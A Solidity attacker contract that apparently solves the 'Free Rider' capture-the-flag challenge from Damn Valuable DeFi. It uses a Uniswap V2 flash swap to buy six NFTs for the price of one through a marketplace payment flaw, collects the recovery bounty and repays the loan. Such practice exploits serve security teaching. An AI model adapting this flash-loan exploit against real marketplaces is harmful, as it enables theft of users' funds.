// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IWETH {
    function withdraw(uint wad) external;
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
}

contract FreeRiderAttacker is IERC721Receiver {
    FreeRiderNFTMarketplace private immutable marketplace;
    IUniswapV2Pair private immutable pair;
    IWETH private immutable weth;
    DamnValuableNFT private immutable nft;
    FreeRiderRecoveryManager private immutable recoveryManager;
    uint256 private constant NFT_PRICE = 15 ether;

    constructor(
        address payable marketplaceAddress,
        address pairAddress,
        address wethAddress,
        address nftAddress,
        address recoveryManagerAddress
    ) {
        marketplace = FreeRiderNFTMarketplace(marketplaceAddress);
        pair = IUniswapV2Pair(pairAddress);
        weth = IWETH(wethAddress);
        nft = DamnValuableNFT(nftAddress);
        recoveryManager = FreeRiderRecoveryManager(recoveryManagerAddress);
    }

    function attack() external {
        // Request flash loan of 15 WETH
        pair.swap(NFT_PRICE, 0, address(this), abi.encode("flashloan"));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        require(msg.sender == address(pair), "not pair");

        // Unwrap WETH to ETH
        weth.withdraw(NFT_PRICE);

        // Buy all 6 NFTs
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: NFT_PRICE}(tokenIds);

        // Transfer NFTs to recovery manager to get bounty
        bytes memory encodedAddress = abi.encode(address(this));
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, encodedAddress);
        }

        // Calculate repayment amount with 0.3% fee
        uint256 fee = (NFT_PRICE * 3) / 997 + 1;
        uint256 amountToRepay = NFT_PRICE + fee;

        // Convert received ETH to WETH and repay flash loan
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(pair), amountToRepay);

        //  Send the remaining ETH to the attacker
        payable(tx.origin).transfer(address(this).balance);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {
    }
}
